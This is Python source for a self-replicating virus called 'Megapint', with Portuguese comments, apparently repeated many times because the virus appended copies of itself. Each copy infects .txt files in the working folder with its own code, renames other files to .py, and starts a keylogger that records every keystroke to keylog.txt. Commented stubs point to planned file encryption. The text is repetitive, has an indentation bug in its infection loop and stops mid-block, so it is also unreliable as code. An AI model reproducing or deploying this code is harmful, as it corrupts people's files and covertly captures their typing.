    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

